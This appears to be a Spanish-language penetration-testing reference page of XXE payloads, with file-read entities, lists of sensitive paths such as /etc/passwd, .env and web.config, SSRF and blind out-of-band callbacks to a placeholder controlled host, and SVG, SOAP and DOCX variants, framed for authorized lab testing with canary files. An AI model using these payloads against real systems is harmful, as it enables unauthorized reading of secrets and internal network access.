# 🗡️ XML External Entity (XXE): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Control de entidad interna

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY marca "prueba-123">]>
<root>&marca;</root>
```

**Cuándo usarlo:** Confirma solo soporte de DTD y expansión interna; no demuestra acceso a archivos ni red.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe).


### Linux: archivo canary propio

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///tmp/xxe-canary-{NONCE}.txt">]>
<root>&xxe;</root>
```

**Cuándo usarlo:** Crear antes el archivo de prueba en el laboratorio y buscar su contenido único en la respuesta. Cada bloque XML es un documento independiente.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe).


### Linux: rutas de referencia

```text
file:///tmp/xxe-canary-{NONCE}.txt
file:///etc/hostname
file:///etc/hosts
file:///etc/os-release
file:///proc/version
file:///proc/self/cmdline
file:///proc/self/environ
file:///etc/passwd
file:///var/www/html/robots.txt
file:///var/www/html/config.php
file:///var/www/html/.env
```

**Cuándo usarlo:** Sustituir una ruta cada vez en SYSTEM y preferir canary. proc/self/environ, config.php y .env pueden contener secretos: solo laboratorio o permiso expreso; detenerse y redactar.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).


### Windows: archivo canary propio

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/xxe-lab/canary-{NONCE}.txt">]>
<root>&xxe;</root>
```

**Cuándo usarlo:** Crear C:\xxe-lab\canary-{NONCE}.txt en una VM propia; el URI file usa barras normales y C: como volumen.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe).


### Windows: rutas de referencia

```text
file:///C:/xxe-lab/canary-{NONCE}.txt
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/System32/inetsrv/config/applicationHost.config
file:///C:/inetpub/wwwroot/robots.txt
file:///C:/inetpub/wwwroot/web.config
```

**Cuándo usarlo:** Cambiar una ruta por documento. applicationHost.config y web.config pueden contener secretos: solo laboratorio o permiso expreso; no publicar contenido.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).


## 🧭 Payloads por contexto

### XXE hacia receptor HTTP propio

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/xxe-{NONCE}">]>
<root>&xxe;</root>
```

**Cuándo usarlo:** Correlacionar callback del parser con la solicitud; escáner, navegador o prefetch pueden generar ruido.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe).


### SSRF a servicio privado de laboratorio

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{IP_PRIVADA_LAB_PROPIA}:{PUERTO_LAB}/canary-{NONCE}">]>
<root>&xxe;</root>
```

**Cuándo usarlo:** Usar solo IP y puerto de un servicio propio; lectura de red no implica acceso a metadatos ni a cualquier red interna.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe).


### Lista de destinos SSRF propios

```text
http://127.0.0.1:{PUERTO_LAB}/canary-{NONCE}
http://{IP_PRIVADA_LAB_PROPIA}:{PUERTO_LAB}/canary-{NONCE}
https://{CONTROLLED_HOST}/xxe-{NONCE}
```

**Cuándo usarlo:** Una URL por documento; probar solamente donde la política cubra el host y la red. El puerto debe servir un canary inocuo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe).


### XInclude cuando solo controlas un nodo

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///tmp/xxe-canary-{NONCE}.txt" parse="text"/>
</root>
```

**Cuándo usarlo:** Requiere procesador XInclude habilitado; no es una DTD ni sustituye la prueba clásica si controlas el documento completo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe).


### SVG procesado por servidor

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/svg-{NONCE}">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="20">
  <text x="0" y="15">&xxe;</text>
</svg>
```

**Cuándo usarlo:** Solo si el backend analiza SVG. Una petición al abrir la imagen desde el navegador no demuestra XXE servidor.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe).


### SOAP con Envelope y entidad válidos

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/soap-{NONCE}">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><m:prueba xmlns:m="urn:prueba">&xxe;</m:prueba></soap:Body>
</soap:Envelope>
```

**Cuándo usarlo:** Un documento XML completo. El esquema SOAP o gateway puede rechazar DOCTYPE antes del parser; comparar con solicitud válida sin DTD.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe).


## 🔥 Payloads avanzados

### Blind XXE: documento que carga DTD propia

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "https://{CONTROLLED_HOST}/xxe-{NONCE}.dtd">
  %remote;
]>
<root>prueba-123</root>
```

**Cuándo usarlo:** Alojar el contenido DTD del bloque siguiente. Registrar solo callbacks, sin insertar contenido de archivos en URL.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe/blind).


### Blind XXE: contenido de la DTD externa

```dtd
<!ENTITY % callback SYSTEM "https://{CONTROLLED_HOST}/blind-{NONCE}">
%callback;
```

**Cuándo usarlo:** Archivo xxe-{NONCE}.dtd servido desde dominio propio. Si el parser permite entidades de parámetro externas, solicitará el callback.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe/blind).


### Error de recurso inexistente controlado

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///tmp/xxe-inexistente-{NONCE}.txt">]>
<root>&xxe;</root>
```

**Cuándo usarlo:** Un error con la ruta puede revelar resolución externa; no asumir lectura de archivos por un error genérico.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/xxe/blind).


### Wrapper PHP para canary binario

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/tmp/xxe-canary-{NONCE}.txt">]>
<root>&xxe;</root>
```

**Cuándo usarlo:** Solo PHP/libxml y archivo propio en laboratorio. El wrapper puede estar bloqueado o no ser manejado por el parser.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).


## 🔬 Pruebas guiadas por escenario

### 1. Control: entidad interna

**Objetivo:** Establecer que el parser acepta DTD y expande una entidad sin acceso a red.

```xml
<!DOCTYPE r [<!ENTITY marca "prueba-123">]><r>&marca;</r>
```

**Interpretación:** Si aparece prueba-123, solo se confirmó expansión interna; aún falta demostrar entidad externa.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 2. Entidad HTTP externa

**Objetivo:** Resolver un URL HTTPS de dominio propio con identificador único.

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/xxe-prueba-123">]><r>&xxe;</r>
```

**Interpretación:** Correlacionar callback con request del backend; un prefetch del navegador o antivirus no cuenta.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 3. Archivo canary local

**Objetivo:** Solo laboratorio donde el tester creó el archivo fuera de la carpeta de entrada.

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///tmp/xxe-canary.txt">]><r>&xxe;</r>
```

**Interpretación:** La respuesta debe contener el contenido único del archivo de prueba, no solo el literal de la entidad.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 4. XInclude sin DOCTYPE

**Objetivo:** Para inyección en un nodo XML donde no se puede definir DTD; usar canary de laboratorio.

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///tmp/xxe-canary.txt"/></r>
```

**Interpretación:** Solo aplica si el procesador tiene XInclude habilitado; la no inclusión no descarta XXE por DTD.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 5. SVG con entidad externa

**Objetivo:** Cuando la subida de SVG se analiza en servidor, no solo se sirve como archivo estático.

```xml
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/svg-prueba-123">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

**Interpretación:** Registrar solicitud desde el procesador; si viene del navegador al ver SVG, no es XXE servidor.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 6. SOAP XML

**Objetivo:** En un endpoint SOAP de laboratorio que acepta DOCTYPE.

```xml
<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/soap-prueba-123">]><Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><x>&xxe;</x></Body></Envelope>
```

**Interpretación:** Comparar con SOAP sin DTD; el rechazo por esquema puede impedir alcanzar parser vulnerable.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 7. DTD externo para XXE ciega

**Objetivo:** Alojar una DTD propia que contenga `<!ENTITY % cb SYSTEM "https://{CONTROLLED_HOST}/dtd-callback-123"> %cb;`; requiere entidades de parámetro externas.

```xml
<!DOCTYPE r [<!ENTITY % dtd SYSTEM "https://{CONTROLLED_HOST}/prueba.dtd"> %dtd;]><r>prueba</r>
```

**Interpretación:** El payload XML es un solo documento. Distinguir descarga de la DTD de la segunda llamada; ninguna implica lectura de archivo.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 8. Entidad PUBLIC externa

**Objetivo:** Algunos parsers tratan PUBLIC y SYSTEM de modo similar; host propio solamente.

```xml
<!DOCTYPE r [<!ENTITY xxe PUBLIC "id-prueba" "https://{CONTROLLED_HOST}/public-123">]><r>&xxe;</r>
```

**Interpretación:** Solo un callback desde parser muestra resolución; un error de DTD no descarta SYSTEM.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 9. Entidad de parámetro externa

**Objetivo:** Cuando el parser resuelve entidades dentro del DTD.

```xml
<!DOCTYPE r [<!ENTITY % p SYSTEM "https://{CONTROLLED_HOST}/param-123"> %p;]><r>prueba</r>
```

**Interpretación:** La descarga del recurso confirma resolución de parámetros; no implica acceso a archivos.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 10. Wrapper PHP sobre canary

**Objetivo:** Solo laboratorio PHP con archivo propio; devolver base64 facilita observar contenido no XML.

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/tmp/xxe-canary.txt">]><r>&xxe;</r>
```

**Interpretación:** Decodificar únicamente el canary de prueba; la disponibilidad del wrapper depende del parser y de PHP.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

### 11. XML admitido en endpoint de formulario

**Objetivo:** En un endpoint propio que normalmente recibe form-urlencoded, comprobar si también analiza XML.

```http
POST /api/test-owned HTTP/1.1
Host: {ORIGEN}
Content-Type: text/xml

<!DOCTYPE r [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/tipo-xml-123">]><r><dato>&xxe;</dato></r>
```

**Interpretación:** Primero validar que el XML sin DTD cumple la operación; el callback de backend confirma la superficie XML oculta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/xxe).

### 12. Entidad en DOCX procesado por el servidor

**Objetivo:** Solo en un DOCX de laboratorio propio: insertar este XML en `word/document.xml` y volver a empaquetar.

```xml
<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/docx-123">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>
```

**Interpretación:** El paquete DOCX debe seguir siendo válido. Solo cuenta una solicitud originada por el procesador servidor, no la vista local del archivo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/xxe).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
